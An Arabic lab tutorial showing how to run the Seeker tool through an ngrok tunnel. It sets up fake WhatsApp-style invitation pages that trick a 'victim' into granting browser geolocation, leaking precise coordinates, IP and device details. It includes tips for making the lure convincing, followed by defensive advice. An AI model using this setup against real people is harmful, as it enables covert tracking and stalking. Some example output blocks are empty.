# اختبار تحديد الموقع الجغرافي والهندسة الاجتماعية في مختبر معزول

## الهدف من الاختبار

يوضح هذا الاختبار كيف يمكن للمخترقين استغلال الهندسة الاجتماعية والروابط الملغومة لجمع معلومات حساسة عن الضحايا، بما فيها:

- تحديد الموقع الجغرافي الدقيق (إحداثيات Latitude و Longitude)
- جمع معلومات الجهاز (نظام التشغيل، نوع المتصفح، دقة الشاشة)
- الحصول على عنوان IP العام (Public IP)
- معلومات مزود الإنترنت (ISP) والدولة والمدينة

> [!CAUTION]
> نفّذ هذا الاختبار فقط في بيئة مختبرية معزولة وبموافقة كتابية من جميع المشاركين. **لا تستخدم هذا الاختبار ضد أشخاص حقيقيين بدون تصريح قانوني صريح**. الهدف تعليمي بحت لفهم المخاطر وتطوير آليات الدفاع.

## فكرة الاختبار

تعتمد هذه الهجمة على **ثلاث عناصر أساسية:**

### 1. الهندسة الاجتماعية
المخترق ينشئ صفحة هبوط مزيفة تبدو كأنها دعوة لخدمة شهيرة (WhatsApp، Google Drive، Telegram، Zoom)

### 2. طلب صلاحيات الموقع الجغرافي
عند الضغط على الزر، يطلب المتصفح من الضحية السماح بالوصول إلى موقعه الجغرافي (Geolocation API)

### 3. جمع البيانات
عند موافقة الضحية، يتم إرسال جميع البيانات الحساسة إلى خادم المخترق

## بيئة المختبر المستخدمة

| العنصر | الوصف |
|---|---|
| **نظام التشغيل** | Kali Linux أو أي توزيعة Linux |
| **الأداة الأولى** | Seeker (لإنشاء صفحات الهندسة الاجتماعية) |
| **الأداة الثانية** | ngrok (لإنشاء نفق خارجي آمن) |
| **لغة البرمجة** | Python 3 |
| **المنفذ المحلي** | 5050 |
| **الجهاز الضحية** | جهاز معزول في نفس المختبر أو افتراضي |

## المرحلة الأولى: تثبيت وإعداد الأدوات

### 1.1 تثبيت أداة Seeker

```bash
# نسخ المستودع
git clone https://github.com/the-white-hatter/seeker.git

# الانتقال إلى المجلد
cd seeker

# إعطاء صلاحية التنفيذ لملف التثبيت
chmod +x install.sh

# تشغيل تثبيت الأداة
sudo ./install.sh
```

**شرح الأوامر:**
- `git clone`: تنزيل كود أداة Seeker من مستودع GitHub
- `chmod +x`: إعطاء صلاحية التنفيذ لملف البرنامج
- `sudo ./install.sh`: تثبيت الأداة بصلاحيات المسؤول

### 1.2 تثبيت وتكوين ngrok

**الخطوة 1: تنزيل ngrok**

```bash
# تنزيل ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip

# فك الضغط
unzip ngrok-v3-stable-linux-amd64.zip

# نقل إلى مجلد bin لتسهيل الوصول
sudo mv ngrok /usr/local/bin/
```

**الخطوة 2: ربط حسابك بـ ngrok**

```bash
# الحصول على Authentication Token من https://dashboard.ngrok.com/auth/your-authtoken
ngrok config add-authtoken <YOUR_AUTHTOKEN>
```

قم بـ:
1. زيارة [ngrok Dashboard](https://dashboard.ngrok.com)
2. تسجيل حساب مجاني
3. نسخ Authorization Token الخاص بك
4. تشغيل الأمر أعلاه مع استبدال `<YOUR_AUTHTOKEN>` بالتوكن الفعلي

## المرحلة الثانية: إعداد وتشغيل الهجوم

### 2.1 فتح نافذة Terminal الأولى - تشغيل ngrok

```bash
# تشغيل نفق ngrok على المنفذ 5050
ngrok http 5050
```

**النتيجة المتوقعة:**
```text
ngrok                                          (Ctrl+C to quit)
                                               
Session Status                online           
Account                       <your-account>  
Version                        3.0.0           
Region                         United States (us)
Latency                         45ms            
Web Interface                  http://127.0.0.1:4040
Forwarding                     https://xxxx-xx-xxx-xxx-x.ngrok.io -> http://localhost:5050
```

**احفظ الرابط الذي يبدأ بـ `https://` - هذا هو الرابط الذي ستُرسله للضحية**

### 2.2 فتح نافذة Terminal الثانية - تشغيل Seeker

```bash
# الانتقال إلى مجلد Seeker
cd ~/seeker

# تشغيل أداة Seeker مع تحديد طريقة التشغيل والقالب والمنفذ
python3 seeker.py -t manual -k google_earth -p 5050
```

**شرح المعاملات:**
- `-t manual`: اختيار يدوي للسيناريو
- `-k google_earth`: حفظ الإحداثيات في ملف Google Earth (.kml)
- `-p 5050`: استخدام المنفذ 5050

### 2.3 اختيار سيناريو الهندسة الاجتماعية

```text

```

**المثال: اختيار WhatsApp**

**ملاحظات مهمة:**
- اختر اسم مجموعة جذاب وذو مصداقية عالية
- استخدام صورة حقيقية تزيد من احتمالية تصديق الضحية
- كل سيناريو مصمم ليبدو حقيقياً قدر الإمكان

## المرحلة الثالثة: اختبار الهجوم

### 3.1 إرسال الرابط للضحية

بعد إعداد Seeker، ستحصل على رابط مشابه لهذا:

```
https://xxxx-xx-xxx-xxx-x.ngrok.io
```

**أرسِل هذا الرابط للجهاز الضحية (في نفس المختبر)**

### 3.2 ما يحدث على جهاز الضحية

1. **الضحية تفتح الرابط** → تظهر صفحة دعوة WhatsApp مزيفة تماماً
2. **الضحية تضغط على "Join Chat"** → يطلب المتصفح إذن الوصول للموقع
3. **الضحية تضغط "Allow"** → يتم جمع جميع البيانات

### 3.3 استقبال البيانات على جهاز المخترق

عند موافقة الضحية، ستظهر البيانات فوراً في نافذة Seeker:

```text

[+] City: Riyadh

[+] Screen Resolution: 1440x3120
```

**سيتم أيضاً حفظ ملف `.kml` يمكن فتحه في Google Earth لتصور الموقع بشكل واضح**

## المرحلة الرابعة: تحليل البيانات المجمعة

### 4.1 فتح ملف Google Earth

```bash
# افتح ملف .kml المُنشأ
google-earth-pro seeker_location.kml
```

ستظهر خريطة تفاعلية توضح الموقع الجغرافي الدقيق للضحية

### 4.2 معلومات IP المفصلة

استخدم خدمات online مثل:
- `whois <IP Address>`: للحصول على معلومات تفصيلية عن IP
- `geoiplookup <IP Address>`: للحصول على موقع IP

```bash
# مثال
whois 192.168.1.100
geoiplookup 192.168.1.100
```

### 4.3 فحص User Agent

User Agent يخبرك بـ:
- نوع نظام التشغيل بالضبط والإصدار
- نوع المتصفح والإصدار
- دقة الشاشة ونسبة البكسل
- وجود البرامج الإضافية

## نصائح الحماية والوقاية

### للمستخدمين:

1. **عدم السماح بصلاحيات الموقع** لأي موقع يطلبها بدون سبب منطقي
   ```
   ✓ قبول: خدمة توصيل طعام تطلب موقعك
   ✗ رفض: موقع عشوائي يطلب موقعك
   ```

2. **التحقق من الرابط** قبل النقر عليه
   - تجنب الروابط المختصرة (Bitly, TinyURL)
   - الروابط الموثوقة تبدأ بـ `https://` و لها قفل أخضر
   - تحقق من نطاق الموقع (domain name)

3. **استخدام VPN**
   ```bash
   # VPN يخفي عنوان IP الحقيقي
   # يمكن استخدام خدمات مثل: ProtonVPN, ExpressVPN, NordVPN
   ```

4. **تعطيل الموقع الجغرافي** في المتصفح عند عدم الحاجة
   ```
   Chrome: ⋮ > الإعدادات > الخصوصية > الموقع الجغرافي > تعطيل
   Firefox: ☰ > خيارات > الخصوصية > المواقع الجغرافية > تعطيل
   ```

### للمنظمات:

1. **التوعية الأمنية** للموظفين عن مخاطر الهندسة الاجتماعية
2. **سياسات قوية** للتحكم في صلاحيات التطبيقات
3. **DLP (Data Loss Prevention)** لمراقبة تسريب البيانات
4. **شبكات VPN إلزامية** عند الوصول من أماكن غير آمنة

## حدود الاختبار

- ✓ يعمل مع أي جهاز متصل بالإنترنت (Mobile, Desktop, Tablet)
- ✓ يعمل عبر HTTP و HTTPS
- ✓ الدقة تعتمد على جودة GPS/Geolocation

- ✗ بعض المتصفحات تحذر من الروابط المشبوهة (Firefox, Chrome)
- ✗ بعض الأجهزة قد تكون معطلة الموقع الجغرافي افتراضياً
- ✗ بعض المناطق تتطلب VPN للعمل مع Geolocation API
- ✗ قد لا يعمل مع الأجهزة التي تستخدم Private Browsing

## الخلاصة الأمنية

هذا الاختبار يثبت أن:
- البيانات الشخصية والموقع الجغرافي قد تُكشف عبر الروابط البسيطة
- الهندسة الاجتماعية أقوى من أي جدار حماية تقني
- الوعي والحذر هما أقوى دفاع ضد هذه الهجمات
- صلاحيات الموقع الجغرافي يجب أن تُمنح بحذر شديد
